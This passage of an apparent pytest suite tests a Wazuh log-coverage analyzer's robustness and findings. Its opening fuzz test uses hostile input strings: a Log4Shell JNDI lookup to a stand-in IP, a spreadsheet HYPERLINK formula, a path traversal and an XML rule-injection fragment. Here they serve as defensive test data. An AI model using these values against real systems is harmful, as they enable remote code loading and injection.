        '</field></rule><rule id="100999" level="0">',
        '=HYPERLINK("http://198.51.100.7")',
        "../../etc/x",
        "${jndi:ldap://203.0.113.9/a}",
        "",
    ]
    events: list[Event] = []
    for i in range(300):
        events.append(
            Event(
                ts=BASE + timedelta(minutes=i),
                rule_id=rng.choice(["203", None, "x" * 50, ["202"]]),  # type: ignore[arg-type]
                source=rng.choice([*weird, None, 42]),  # type: ignore[arg-type]
                log_source=rng.choice([*weird, None, ["Security"]]),  # type: ignore[arg-type]
                event_code=rng.choice(["4688", "004688", 4624, True, 10**30, "9" * 40, None, ["1"], " 1 "]),  # type: ignore[arg-type]
                os_platform=rng.choice(["Windows", "Microsoft Windows Server 2022", "ubuntu", "x" * 500, 3, None]),  # type: ignore[arg-type]
                rule_groups=rng.choice([(), ("agent_flooding",)]),
                fields=rng.choice(
                    [
                        {},
                        {"agent": {"id": "000", "name": "wazuh-manager"}},
                        {"agent.id": ["000"]},
                        {"agent.id": True},
                        {"agent.id": "0" * 10_000},
                    ]
                ),
            )
        )
    agents: list[Any] = [
        agent("x" * 5000, "disconnected", keepalive=datetime(9999, 12, 31, tzinfo=UTC)),
        agent("", "active"),
        agent("ws-01.example", "\x00weird\x00" * 10, keepalive=datetime(2026, 9, 3)),  # naive keepalive
        AgentInfo(id="002", name="ws-02.example", status=None, groups=None),  # type: ignore[arg-type]
        "not an agent",
    ]
    tenant = TenantConfig(expectations=[Expectation(name="e", log_sources=["[", "*"], match={"name": ["[", 5]})])
    result = run(events, tenant, agents=agents)
    for key in result.section["platforms"]:
        assert len(key) <= 32
    for row in result.section["matrix"]:
        assert len(row["agent"].value) <= 256
    collector = collect(events)
    for stats in collector.agents.values():
        assert len(stats.name) <= 256
        for name, src in stats.sources.items():
            assert len(name) <= 512
            assert all(len(code) <= 16 for code in src.codes)
    assert collector.unattributed > 0


def test_event_codes_are_normalized_and_bounded() -> None:
    collector = CoverageCollector(TenantConfig(), max_codes_per_source=3)
    for i, code in enumerate(["004688", "4688", 4688, "7", "8", "9", "10", "4624"]):
        collector.add(ev("ws-01.example", BASE + timedelta(minutes=i), "Security", code=code))  # type: ignore[arg-type]
    codes = collector.agents["ws-01.example"].sources["Security"].codes
    assert codes["4688"][0] == 3
    assert "4624" in codes and "10" in codes  # watched codes are always kept
    assert collector.codes_overflow >= 1
    assert "4624" in WATCH_CODES


def test_caps_are_reported() -> None:
    collector = CoverageCollector(TenantConfig(), max_agents=3, max_sources_per_agent=2)
    for i in range(5):
        for ls in ("a", "b", "c"):
            collector.add(ev(f"h{i}", BASE, ls))
    assert len(collector.agents) == 3
    assert collector.agents_overflow == 6
    assert collector.sources_overflow == 3
    assert collector.truncated
    result = analyze_coverage(collector, tenant=TenantConfig(), now=NOW)
    assert result.section["truncated"] is True


def test_merge_matches_single_pass() -> None:
    names = windows_names("ws", 8)
    events = fleet(names, {names[1]: {"Security": ["4624"], "System": ["7036"], SYSMON: ["1", "3"]}})
    events.append(ev(names[2], NOW, "wazuh-agent", rule_id="203", groups=("agent_flooding",)))
    random.Random(3).shuffle(events)
    whole = collect(events)
    left, right = collect(events[: len(events) // 2]), collect(events[len(events) // 2 :])
    left.merge(right)
    assert left.events == whole.events
    tenant = TenantConfig()
    a = analyze_coverage(whole, tenant=tenant, now=NOW)
    b = analyze_coverage(left, tenant=tenant, now=NOW)
    assert [f.fingerprint for f in a.findings] == [f.fingerprint for f in b.findings]
    assert a.section["matrix"] == b.section["matrix"]


def test_input_order_does_not_change_results() -> None:
    names = windows_names("ws", 8)
    events = fleet(names, {names[5]: {"Security": ["4624"], "System": ["7036"], SYSMON: ["1"]}})
    first = run(events)
    random.Random(11).shuffle(events)
    second = run(events)
    assert [f.fingerprint for f in first.findings] == [f.fingerprint for f in second.findings]


def test_empty_input() -> None:
    result = run([])
    assert result.findings == []
    assert result.section["status"] == "not_assessed"
    assert result.section["matrix"] == []


def test_nested_fields_are_understood() -> None:
    fields = {"agent": {"id": "000", "name": "wazuh-manager"}}
    collector = collect([ev("wazuh-manager", BASE, "ossec", fields=fields)])
    assert collector.agents["wazuh-manager"].is_manager


@pytest.mark.parametrize(
    ("value", "family"),
    [
        ("windows", "windows"),
        ("Microsoft Windows Server 2019 Datacenter", "windows"),
        ("ubuntu", "linux"),
        ("rhel", "linux"),
        ("amzn", "linux"),
        ("opensuse-leap", "linux"),
        ("darwin", "darwin"),
        ("macOS", "darwin"),
        ("freebsd", "bsd"),
        ("sunos", "solaris"),
        ("network", "network"),
        ("", None),
        ("   ", None),
        ("x" * 100, None),
        ("Weird OS 9!", "weirdos9"),
        ("🙂", None),
    ],
)
def test_platform_family(value: str, family: str | None) -> None:
    assert platform_family(value) == family


def test_large_fleet_is_fast_enough() -> None:
    # 2,000 hosts x 3 sources x 24 samples ~ 144k events; single pass + analysis must stay snappy
    events: list[Event] = []
    names = [f"ws-{i:04d}.corp.example" for i in range(2000)]
    for i, name in enumerate(names):
        sources = WIN_SOURCES if i % 50 else {"Security": ["4624", "4688"], "System": ["7036"]}
        events.extend(host_events(name, sources, step=timedelta(hours=3)))
    result = run(events)
    gaps = by_kind(result, "coverage.missing_source")
    assert len(gaps) == 1 and gaps[0].evidence["hosts_total"] == 40
    assert len(gaps[0].evidence["hosts"]) == 40


def test_random_names_do_not_break_join() -> None:
    rng = random.Random(5)
    alphabet = string.ascii_letters + string.digits + ".-_"
    names = {"".join(rng.choice(alphabet) for _ in range(rng.randint(1, 20))) for _ in range(200)}
    events = [ev(n, BASE, "Security", code="4624") for n in names]
    agents = [agent(n.upper(), agent_id=str(i)) for i, n in enumerate(sorted(names))]
    result = run(events, agents=agents, wallclock=NOW)
    listed = [r["agent"].value for r in result.section["matrix"]]
    assert len(listed) == len(set(listed))


# ---- regression tests (review) --------------------------------------------------------------------------------------


def test_contract_event_rate_is_not_judged_on_alerts_only_data() -> None:
    # alerts are a small subset of the events: 36 alerts/day say nothing about a 500 events/day contract
    tenant = contract_tenant(
        Expectation(
            name="busy security", log_sources=["Security"], match={"platform": "windows"}, min_events_per_day=500
        )
    )
    result = run(fleet(windows_names("ws", 3)), tenant, basis=ALERTS)
    assert by_kind(result, "coverage.missing_source") == []
    assert result.section["counters"]["contract_rate_not_assessed"] == 3
    row = result.section["expected_sources"][0]
    assert row["not_assessed"] == 3 and row["low"] == 0
    # a sampled or truncated archive undercounts too
    sampled = DataBasis(input_kind="archives", sampled=True)
    assert (
        by_kind(run(fleet(windows_names("ws", 3), rule_id=None), tenant, basis=sampled), "coverage.missing_source")
        == []
    )
    # full-fidelity data measures the rate
    result = run(fleet(windows_names("ws", 3), rule_id=None), tenant, basis=RAW)
    assert [f.evidence["state"] for f in by_kind(result, "coverage.missing_source")] == ["low"]


def test_absence_on_alerts_or_incomplete_input_is_low_confidence_and_at_most_medium() -> None:
    names = [f"dc{i:02d}.corp.example" for i in range(8)]
    tenant = TenantConfig(criticality={"critical": ["dc*"]})
    events = fleet(names, {names[7]: {"Security": ["4624"], "System": ["7036"]}})  # no Sysmon, no 4688
    for basis in (ALERTS, DataBasis(input_kind="archives", partial_failures=["shard 2 of wazuh-alerts failed"])):
        result = run(events, tenant, basis=basis)
        found = [f for f in result.findings if f.domain == "coverage"]
        assert {f.kind for f in found} == {"coverage.missing_source", "coverage.missing_event_type"}
        for finding in found:
            assert finding.severity is Severity.MEDIUM, (basis, finding.subject)
            assert finding.confidence is Confidence.LOW
            keys = {r.key for r in finding.reasons if isinstance(r, Message)}
            assert keys & {"coverage.reason.alerts_basis", "coverage.reason.incomplete_basis"}
        assert result.section["status"] == "warn"  # inferred absence never turns the domain red
    # the same gap measured on complete archives is a HIGH blind spot on a critical host
    result = run(fleet(names, {names[7]: {"Security": ["4624"], "System": ["7036"]}}, rule_id=None), tenant)
    assert {f.severity for f in result.findings if f.domain == "coverage"} == {Severity.HIGH}
    assert result.section["status"] == "fail"


def test_host_beyond_the_source_cap_is_not_judged_missing() -> None:
    tenant = TenantConfig(
        expectations=[Expectation(name="sysmon", log_sources=[SYSMON], match={"platform": "windows"})]
    )
    names = windows_names("ws", 7)
    events = fleet(names)
    # the capped host sends Sysmon too, but only after 3 other sources filled its cap of 3
    noisy = names[0]
    events = [e for e in events if e.source != noisy]
    events += list(host_events(noisy, {"A": ["1"], "B": ["1"], "C": ["1"], **WIN_SOURCES}, rule_id=None))
    collector = collect(events, tenant, max_sources_per_agent=3)
    result = analyze_coverage(collector, tenant=tenant, now=NOW, basis=RAW)
    assert not [f for f in result.findings if noisy in host_values(f)]
    assert result.section["truncated"] is True


def test_relayed_syslog_devices_are_bound_only_by_name_or_network_contracts() -> None:
    relayed = {"agent.name": "wazuh-manager", "agent.id": "000"}
    events: list[Event] = []
    for device, location, platform in (
        ("fw-edge-01", "syslog", "network"),
        ("fw-edge-02", "/var/log/remote/fw-edge-02.log", "linux"),  # platform inferred from the relay path
    ):
        fields = {**relayed, "predecoder.hostname": device}
        events += [
            ev(device, BASE + timedelta(hours=h), location, platform=platform, fields=fields, rule_id=None)
            for h in range(72)
        ]
    events += fleet(["ws-01.corp.example"], rule_id=None)
    tenant = contract_tenant(
        Expectation(name="everything sends sysmon", log_sources=["*sysmon*"], match={}),
        Expectation(name="linux audit", log_sources=["/var/log/audit/audit.log"], match={"platform": "linux"}),
    )
    result = run(events, tenant, basis=RAW)
    assert by_kind(result, "coverage.missing_source") == []
    # a contract that targets the devices by name (or platform: network) still applies to them
    tenant = contract_tenant(
        Expectation(name="firewalls", log_sources=["/var/log/remote/*"], match={"name": "fw-edge-*"}),
        Expectation(name="network", log_sources=["syslog"], match={"platform": "network"}),
    )
    result = run(events, tenant, basis=RAW)
    gaps = by_kind(result, "coverage.missing_source")
    assert [(f.evidence["contract"], host_values(f)) for f in gaps] == [("firewalls", {"fw-edge-01"})]


def test_contract_matching_no_host_is_not_assessed_not_compliant() -> None:
    tenant = contract_tenant(Expectation(name="dcs", log_sources=["Directory Service"], match={"groups": ["dcs"]}))
    result = run(fleet(windows_names("ws", 2), rule_id=None), tenant)
    assert "contract_no_hosts:dcs" in result.section["not_assessed"]


def test_contract_name_patterns_are_entities_not_plain_text() -> None:
    tenant = contract_tenant(
        Expectation(
            name="dc", log_sources=["Directory Service"], match={"platform": "windows", "name": "dc01.corp.example"}
        )
    )
    result = run(fleet(["dc01.corp.example"], rule_id=None), tenant, basis=RAW)
    finding = by_kind(result, "coverage.missing_source")[0]
    params: list[Any] = [finding.evidence, *(dict(r.params) for r in finding.reasons if isinstance(r, Message))]
    assert "dc01.corp.example" not in " ".join(_plain_strings(params))
    assert finding.evidence["name_patterns"] == [Entity("host", "dc01.corp.example")]
    assert "dc01.corp.example" in " ".join(render(r) for r in finding.reasons)


def test_alert_burst_is_not_a_stopped_event_type() -> None:
    # alerts: a detection rule on 4688 fired 40 times in one afternoon, then never again -> not "auditing stopped"
    host = "dc01.corp.example"
    tenant = TenantConfig(criticality={"critical": ["dc*"]})
    events = list(host_events(host, {"Security": ["4624"]}, start=BASE - timedelta(days=4)))
    events += [
        ev(host, BASE - timedelta(days=3) + timedelta(minutes=9 * i), "Security", code="4688", rule_id="92052")
        for i in range(40)
    ]
    assert by_kind(run(events, tenant), "coverage.missing_event_type") == []
    # ... nor a longer episode (30 h) followed by days without one: on alerts it must have been seen for at least as
    # long as it has been missing
    events = list(host_events(host, {"Security": ["4624"]}, start=BASE - timedelta(days=4)))
    events += [
        ev(host, BASE - timedelta(days=3) + timedelta(minutes=45 * i), "Security", code="4688", rule_id="92052")
        for i in range(41)
    ]
    assert by_kind(run(events, tenant), "coverage.missing_event_type") == []
    # on complete archives, 4688 flowing steadily for days and then stopping is still flagged
    stop = NOW - timedelta(days=2)
    steady = list(host_events(host, stop={("Security", "4688"): stop}, start=BASE - timedelta(days=4), rule_id=None))
    found = by_kind(run(steady, tenant), "coverage.missing_event_type")
    assert [f.severity for f in found] == [Severity.CRITICAL]
    assert found[0].confidence is Confidence.HIGH


def test_sparse_contract_source_pause_on_alerts_is_not_silence() -> None:
    host = "dc01.corp.example"
    tenant = TenantConfig(
        criticality={"critical": ["dc*"]},
        expectations=[Expectation(name="dc dirsvc", log_sources=["Directory Service"], match={"name": "dc*"})],
    )
    events = list(host_events(host, {"Security": ["4624"]}, start=BASE - timedelta(days=4)))
    events += [ev(host, BASE + timedelta(hours=10 * i), "Directory Service", code="2889") for i in range(3)]
    result = run(events, tenant)  # alerts: three alerts, then a day without one
    assert by_kind(result, "coverage.missing_source") == []
    assert result.section["counters"]["contract_silence_not_assessed"] == 1
    # a dense series that stops is still reported on alerts (its own history is the evidence)
    events = list(host_events(host, {"Security": ["4624"]}, start=BASE - timedelta(days=4)))
    events += list(
        host_events(host, {"Directory Service": ["2889"]}, start=BASE - timedelta(days=4), end=NOW - timedelta(days=2))
    )
    silent = [f for f in by_kind(run(events, tenant), "coverage.missing_source") if f.evidence["state"] == "silent"]
    assert len(silent) == 1 and silent[0].severity is Severity.CRITICAL
    assert silent[0].confidence is Confidence.MEDIUM


def test_fleet_wide_stop_lists_critical_hosts_beyond_the_caps() -> None:
    stop = NOW - timedelta(days=2)
    names = [*windows_names("ws", 60), "zz-dc01.corp.example"]  # sorts last: beyond every cap before the fix
    tenant = TenantConfig(criticality={"critical": ["zz-dc*"]})
    events: list[Event] = []
    for name in names:
        events.extend(host_events(name, stop={("Security", "4688"): stop}, start=BASE - timedelta(days=4)))
    finding = by_kind(run(events, tenant), "coverage.missing_event_type")[0]
    assert finding.evidence["variant"] == "stopped_fleet"
    assert finding.severity is Severity.CRITICAL
    assert finding.evidence["hosts"][0] == Entity("host", "zz-dc01.corp.example")
    assert finding.evidence["critical_hosts"] == [Entity("host", "zz-dc01.corp.example")]
    assert len(finding.evidence["hosts"]) == 50 and finding.evidence["hosts_total"] == 61
    reasons = [r for r in finding.reasons if isinstance(r, Message)]
    assert any(r.key == "coverage.reason.critical_hosts" for r in reasons)
    assert "zz-dc01.corp.example" in " ".join(render(r, "es") for r in reasons)


def test_just_enrolled_agents_are_not_flagged() -> None:
    agents = [
        agent("ws-new.corp.example", "never_connected", keepalive=None, date_add=NOW - timedelta(minutes=10)),
        agent("ws-new2.corp.example", "active", keepalive=NOW, date_add=NOW - timedelta(minutes=30), agent_id="011"),
        agent("ws-01.corp.example", "active", keepalive=NOW, agent_id="001"),
    ]
    result = run(fleet(["ws-01.corp.example"], rule_id=None), agents=agents, wallclock=NOW)
    assert [f for f in result.findings if f.domain == "pipeline"] == []
    counters = result.section["counters"]
    assert counters["agents_never_connected_recent"] == 1 and counters["no_data_not_assessed"] == 1
    # the same agents enrolled a month ago are real problems
    agents[0].date_add = agents[1].date_add = NOW - timedelta(days=30)
    result = run(fleet(["ws-01.corp.example"], rule_id=None), agents=agents, wallclock=NOW)
    assert sorted(f.kind for f in result.findings) == ["pipeline.agent_disconnected", "pipeline.agent_no_data"]


def test_mass_disconnection_and_decommissioned_agents_are_grouped() -> None:
    tenant = TenantConfig(criticality={"critical": ["dc*"]})
    agents = [
        agent(
            f"lap-{i:03d}.corp.example", "disconnected", keepalive=NOW - timedelta(days=90 + i), agent_id=f"{100 + i}"
        )
        for i in range(40)
    ]
    agents += [
        agent(
            f"ws-{i:03d}.corp.example", "disconnected", keepalive=NOW - timedelta(hours=30 + i), agent_id=f"{300 + i}"
        )
        for i in range(60)
    ]
    agents += [
        agent("dc01.corp.example", "disconnected", keepalive=NOW - timedelta(hours=6), agent_id="901"),
        agent("dc02.corp.example", "active", keepalive=NOW, agent_id="902"),
    ]
    result = run([], tenant, agents=agents, wallclock=NOW)
    found = {f.subject: f for f in result.findings}
    assert set(found) == {"agents:stale|tier:standard", "agents:disconnected|tier:standard", "agent:dc01.corp.example"}
    stale, down, dc = (
        found["agents:stale|tier:standard"],
        found["agents:disconnected|tier:standard"],
        found["agent:dc01.corp.example"],
    )
    # 40 retired laptops: one hygiene finding, not 40 HIGH ones
    assert stale.kind == "pipeline.agent_disconnected" and stale.severity is Severity.MEDIUM
    assert stale.evidence["hosts_total"] == 40 and len(stale.evidence["hosts"]) == 40
    assert "30" in render(stale.title) and "decommissioned" in render(stale.title)
    # 60 servers down at once: one HIGH finding, most agents down -> shared cause
    assert down.severity is Severity.HIGH and down.evidence["hosts_total"] == 60
    assert down.evidence["hosts"][0] == Entity("host", "ws-059.corp.example")  # longest disconnected first
    assert len(down.evidence["hosts"]) == 50 and len(down.evidence["agents"]) == 50
    keys = [r.key for r in down.reasons if isinstance(r, Message)]
    assert "coverage.agent.group.reason.mass" in keys
    # a critical host (fewer than 5 in its tier) keeps its own CRITICAL finding, with the shared-cause hint
    assert dc.severity is Severity.CRITICAL
    assert any(isinstance(r, Message) and r.key == "coverage.agent.group.reason.mass" for r in dc.reasons)
    for finding in result.findings:
        for lang in ("en", "es"):
            for msg in [finding.title, *finding.reasons, finding.recommendation]:
                text = render(msg, lang)
                assert text and "{" not in text, (finding.subject, lang, text)
        params: list[Any] = [finding.evidence, *(dict(m.params) for m in finding.reasons if isinstance(m, Message))]
        params.append(dict(finding.title.params) if isinstance(finding.title, Message) else {})
        assert not {a.name for a in agents} & _plain_strings(params)


def test_critical_tier_groups_list_every_host() -> None:
    tenant = TenantConfig(criticality={"critical": ["dc*"]})
    agents = [
        agent(f"dc{i:03d}.corp.example", "disconnected", keepalive=NOW - timedelta(hours=6), agent_id=f"{i + 1}")
        for i in range(120)
    ]
    finding = run([], tenant, agents=agents, wallclock=NOW).findings[0]
    assert finding.subject == "agents:disconnected|tier:critical" and finding.severity is Severity.CRITICAL
    assert len(finding.evidence["hosts"]) == 120


def test_agent_buffer_flooding_on_many_agents_is_one_finding() -> None:
    events: list[Event] = []
    for i in range(6):
        events.append(ev(f"ws-{i:02d}.corp.example", NOW - timedelta(hours=i), "wazuh-agent", rule_id="203",
                         groups=("agent_flooding",)))  # fmt: skip
    finding = by_kind(run(events), "pipeline.manager_drops")
    assert [f.subject for f in finding] == ["agents:flood_loss|tier:standard"]
    assert finding[0].severity is Severity.HIGH and finding[0].evidence["hosts_total"] == 6
    assert "203" in " ".join(render(r) for r in finding[0].reasons)


def test_fingerprints_are_tenant_scoped() -> None:
    tenant = TenantConfig(name="acme")
    names = windows_names("ws", 8)
    result = run(fleet(names, {names[7]: {"Security": ["4624", "4688"], "System": ["7036"]}}), tenant)
    assert result.findings
    for finding in result.findings:
        assert finding.tenant == "acme"
        assert finding.fingerprint == fingerprint("acme", finding.kind, finding.subject)


def test_partial_sla_override_keeps_the_default_critical_sla() -> None:
    # sla: {standard: 12h} in YAML replaces the whole mapping: "critical" must not fall back to a laxer 24 h
    tenant = TenantConfig(criticality={"critical": ["dc*"]}, sla={"standard": timedelta(hours=12)})
    agents = [agent("dc01.corp.example", "disconnected", keepalive=NOW - timedelta(hours=20))]
    finding = run([], tenant, agents=agents, wallclock=NOW).findings[0]
    assert finding.severity is Severity.CRITICAL and finding.evidence["sla_hours"] == 4.0


def test_peer_expectation_only_covers_when_the_peers_were_sending() -> None:
    defender = "Microsoft-Windows-Windows Defender/Operational"
    names = windows_names("ws", 8)
    start = BASE - timedelta(days=4)
    hourly = timedelta(hours=1)
    events: list[Event] = []
    for name in names[:7]:
        events += list(host_events(name, start=start, rule_id=None, step=hourly))
        # Defender logging rolled out to the fleet one day ago
        events += list(
            host_events(name, {defender: ["1116"]}, start=NOW - timedelta(days=1), rule_id=None, step=hourly)
        )
    # ws-07 went quiet two days ago, before the rollout: it was never expected to send Defender events
    events += list(host_events(names[7], start=start, end=NOW - timedelta(days=2), rule_id=None, step=hourly))
    assert by_kind(run(events, basis=RAW), "coverage.missing_source") == []
    # a host that joined after a source was retired fleet-wide is not missing it either
    legacy = {"Security": ["4624", "4688"], "System": ["7036"], SYSMON: ["1", "3"], "Legacy App": ["100"]}
    events = []
    for name in names[:7]:
        events += list(host_events(name, legacy, start=start, end=NOW - timedelta(days=3), rule_id=None, step=hourly))
        events += list(host_events(name, start=NOW - timedelta(days=3), rule_id=None, step=hourly))
    events += list(host_events(names[7], start=NOW - timedelta(days=2), rule_id=None, step=hourly))
    assert by_kind(run(events, basis=RAW), "coverage.missing_source") == []
    # but a host reporting alongside the peers while they send it is still a gap
    events += list(host_events("ws-99.corp.example", start=start, rule_id=None, step=hourly,
                               stop={(SYSMON, "1"): start, (SYSMON, "3"): start}))  # fmt: skip
    gaps = by_kind(run(events, basis=RAW), "coverage.missing_source")
    assert [(f.evidence["log_source"], host_values(f)) for f in gaps] == [(SYSMON, {"ws-99.corp.example"})]


def test_event_type_expectation_only_covers_when_peers_sent_it() -> None:
    # 4688 auditing was enabled fleet-wide a day ago; ws-07 stopped reporting two days ago
    names = windows_names("ws", 8)
    start = BASE - timedelta(days=4)
    hourly = timedelta(hours=1)
    base_sources = {"Security": ["4624"], "System": ["7036"]}
    events: list[Event] = []
    for name in names[:7]:
        events += list(host_events(name, base_sources, start=start, rule_id=None, step=hourly))
        events += list(
            host_events(name, {"Security": ["4688"]}, start=NOW - timedelta(days=1), rule_id=None, step=hourly)
        )
    events += list(
        host_events(names[7], base_sources, start=start, end=NOW - timedelta(days=2), rule_id=None, step=hourly)
    )
    assert by_kind(run(events, basis=RAW), "coverage.missing_event_type") == []


def test_critical_peer_gap_lists_every_critical_host() -> None:
    tenant = TenantConfig(criticality={"critical": ["dc*"]})
    tenant.silence.peer_coverage = 0.5
    lacking = {"Security": ["4624", "4688"], "System": ["7036"]}
    critical = [f"dc{i:03d}.corp.example" for i in range(70)]
    events = fleet(windows_names("ws", 80), rule_id=None, step=timedelta(hours=6))
    events += fleet(critical, {n: lacking for n in critical}, rule_id=None, step=timedelta(hours=6))
    gap = next(f for f in by_kind(run(events, tenant), "coverage.missing_source") if f.evidence["tier"] == "critical")
    assert gap.evidence["hosts_total"] == 70
    assert host_values(gap) == set(critical)


def test_consumes_agents_exactly_as_the_wazuh_api_client_parses_them() -> None:
    from hushwatch.ingest.wazuh_api import parse_agent

    raw = [
        {"id": "000", "name": "wazuh-manager", "status": "active", "lastKeepAlive": "9999-12-31T23:59:59Z",
         "os": {"platform": "ubuntu", "name": "Ubuntu"}, "dateAdd": "2026-01-01T00:00:00Z"},
        {"id": "001", "name": "ws-01.corp.example", "status": "disconnected", "lastKeepAlive": "2026-09-02T00:00:00Z",
         "os": {"platform": "windows", "name": "Microsoft Windows 11 Pro"}, "group": ["default", "workstations"],
         "dateAdd": "2026-01-01T00:00:00Z"},
        {"id": "002", "name": "srv-db-01.example", "status": "never_connected", "dateAdd": "2026-08-01T00:00:00Z"},
    ]  # fmt: skip
    agents = [a for a in (parse_agent(r) for r in raw) if a is not None]
    assert [a.platform for a in agents] == ["linux", "windows", None]
    result = run([], agents=agents, wallclock=NOW)
    found = {f.subject: f for f in result.findings}
    assert set(found) == {"agent:ws-01.corp.example", "agent:srv-db-01.example"}  # the manager is never judged
    assert found["agent:ws-01.corp.example"].evidence["disconnected_hours"] == 48.0
    rows = {r["agent"].value: r for r in result.section["matrix"]}
    assert rows["ws-01.corp.example"]["platform"] == "windows" and "wazuh-manager" not in rows
    assert result.section["agents"]["by_status"] == {"disconnected": 1, "never_connected": 1}
